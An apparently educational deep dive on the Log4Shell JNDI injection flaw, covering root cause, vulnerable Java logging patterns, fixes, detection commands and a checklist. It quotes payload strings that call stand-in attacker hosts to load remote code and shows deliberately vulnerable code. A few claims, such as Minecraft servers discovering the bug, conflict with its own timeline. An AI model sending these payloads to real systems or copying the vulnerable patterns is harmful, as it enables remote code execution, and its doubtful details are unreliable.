# Log4Shell — JNDI Injection (CVE-2021-44228) Deep Dive

## The Most Exploited CVE of the 2020s

**CVE-2021-44228** (Log4Shell) is a critical remote code execution vulnerability in Apache Log4j 2.x, a widely used Java logging library. With a **CVSS score of 10.0** (the maximum), it was the most severe and widely exploited vulnerability in recent history, affecting millions of servers worldwide.

## Root Cause

Log4j 2.x supports JNDI (Java Naming and Directory Interface) lookups in log messages via the `${}` syntax. When a string like `${jndi:ldap://attacker.com/a}` is logged, Log4j performs a JNDI lookup, which can load and execute arbitrary code from a remote server.

```java
// What happens when this is logged:
logger.info("User request: {}", userInput);

// If userInput = "${jndi:ldap://attacker.com/evil-class}"
// Log4j:
// 1. Sees ${jndi:ldap://...} in the message
// 2. Performs JNDI lookup to attacker.com:1389
// 3. Attacker's LDAP server responds with a reference to a remote Java class
// 4. JVM downloads and executes the class — RCE!
```

## Why This Is Relevant to AI/Vibe Coding

LLMs frequently generate code that logs user input directly:

```java
// AI-GENERATED — logs user input directly
@PostMapping("/api/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    // AI logs the request for debugging
    log.info("Login attempt: username={}, password={}", 
        request.getUsername(), request.getPassword());
    // If username = "${jndi:ldap://evil.com/exploit}", RCE achieved!
}
```

## Impact

- **Authentication bypass**: via LDAP-based JNDI injection
- **RCE**: Full server compromise
- **Data exfiltration**: Log entries can contain environment variables, secrets
- **Wormable**: Log4Shell payloads propagate via logs that are mirrored or centralized

Affected software included: Minecraft servers (who discovered the bug), VMware vCenter, Elasticsearch, Apache Struts, Apache Tomcat, Amazon CloudFront, Apple iCloud, Cloudflare — essentially everything that ran Log4j 2.x.

## Timeline

| Date | Event |
|---|---|
| 2021-11-24 | Chen Zhaojun (Alibaba) privately reports the bug to Apache |
| 2021-12-09 | Public disclosure after the patch is incomplete |
| 2021-12-10 | Active exploitation begins within hours |
| 2021-12-14 | CISA director calls it "worst vulnerability in decades" |
| 2021-12-17 | Log4j 2.17.0 released — final fix |
| 2021-12-28 | CVE-2021-44832 (2.17.0 still vulnerable to another attack vector) |

## Vulnerable Code Patterns

### Pattern 1: Direct Logging of User Input

```java
// AI-GENERATED — logs HTTP request body
logger.info("Request body: {}", requestBody); // RCE if requestBody contains ${jndi:...}
```

### Pattern 2: Logging Error Messages with User Data

```java
// AI-GENERATED — logs exception messages containing user input
try {
    process(data);
} catch (Exception e) {
    log.error("Failed to process: {}", data); // BUG: data may contain JNDI injection
}
```

### Pattern 3: Logging User Agent Strings

```java
// AI-GENERATED — logs HTTP headers
log.info("User-Agent: {}", request.getHeader("User-Agent")); // Common SSRF/RCE vector
```

### Pattern 4: Logging JSON Payloads

```java
// AI-GENERATED — logs full payload as string
@PostMapping("/api/data")
public ResponseEntity<?> receiveData(@RequestBody String rawPayload) {
    log.info("Received: {}", rawPayload); // JNDI in JSON fields!
    // Even if JSON parsing fails, the string is logged first!
}
```

## Fixes and Mitigations

### Fix 1: Update Log4j (Permanent)

```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.20.0</version> <!-- 2.17.0+ is safe, latest is recommended -->
</dependency>
```

### Fix 2: JVM Flag (Immediate Mitigation)

```bash
# Disable message lookups
-Dlog4j2.formatMsgNoLookups=true

# Disable JNDI entirely (JDK 8+)
-Dcom.sun.jndi.ldap.object.trustURLCodebase=false
-Dcom.sun.jndi.rmi.object.trustURLCodebase=false
```

### Fix 3: Remove JndiLookup Class

```bash
# Remove the vulnerable class from the JAR
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

### Fix 4: Code-Level Prevention

```java
// Sanitize log inputs (defense in depth, not a replacement for updating)
public static String sanitizeLogInput(String input) {
    if (input == null) return null;
    return input.replace("${", "\\${"); // Escape JNDI lookup patterns
}

// Usage:
log.info("User input: {}", sanitizeLogInput(userInput));
```

## AI-Generated Fix That Makes Things Worse

```java
// AI-GENERATED BAD FIX — disables lookups incorrectly
System.setProperty("log4j2.formatMsgNoLookups", "false"); // BUG: 'false' enables lookups!
// The property name says 'NoLookups' — setting to 'false' means lookups are NOT disabled
```

**Correct**: The property should be set to `true` to disable lookups, or removed entirely (upgrade is the proper fix).

## Detection

```bash
# Check running Java processes for vulnerable Log4j
jps -l | grep -v Jps
# Then check the classpath of each process for log4j versions

# Scan all JARs in a directory for Log4j:
find / -name "log4j-core*.jar" 2>/dev/null

# Check version in JAR manifest:
unzip -p log4j-core-2.14.1.jar META-INF/MANIFEST.MF

# OWASP Dependency-Check:
mvn org.owasp:dependency-check-maven:check -DfailBuildOnCVSS=5
```

## Beyond Log4Shell: JNDI Injection in General

Log4Shell made JNDI injection famous, but the underlying vulnerability is broader:

```java
// AI-GENERATED — JNDI lookup with user input
Context ctx = new InitialContext();
// BUG: User controls the lookup name
Object obj = ctx.lookup(userInput); // JNDI injection!
```

Any code that performs JNDI lookups with attacker-controlled strings is vulnerable to similar attacks, even without Log4j.

## Real CVEs

- **CVE-2021-44228 (Log4Shell)**: CVSS 10.0 — RCE via JNDI injection in Log4j 2.x lookup feature.
- **CVE-2021-45046 (Log4j 2.15.0 DoS)**: CVSS 9.0 — Incomplete fix in 2.15.0 still allowed DoS and information disclosure in certain non-default configurations.
- **CVE-2021-45105 (Log4j 2.16.0 DoS)**: CVSS 7.5 — Infinite recursion via self-referential JNDI lookups caused stack overflow DoS.
- **CVE-2021-44832 (Log4j 2.17.0 RCE)**: CVSS 6.6 — RCE via JDBC Appender with attacker-controlled configuration data.

## Prevention Checklist

1. **Update Log4j to 2.17.0+** — This is the only complete fix.
2. **Set JVM flags** — `-Dlog4j2.formatMsgNoLookups=true` as defense in depth.
3. **Sanitize log inputs** — Escape `${}` in user-controlled log messages.
4. **Disable JNDI remote class loading** — `-Dcom.sun.jndi.ldap.object.trustURLCodebase=false`.
5. **Scan all dependencies** — Log4j can be a transitive dependency from any library.
6. **Monitor logs for JNDI patterns** — Alert on `${jndi:` in log messages.
7. **Use Structured Logging** — slf4j + logstash-logback-encoder logs parameters separately, avoiding string interpolation entirely.
8. **Run OWASP Dependency-Check** — In CI to detect vulnerable Log4j versions.
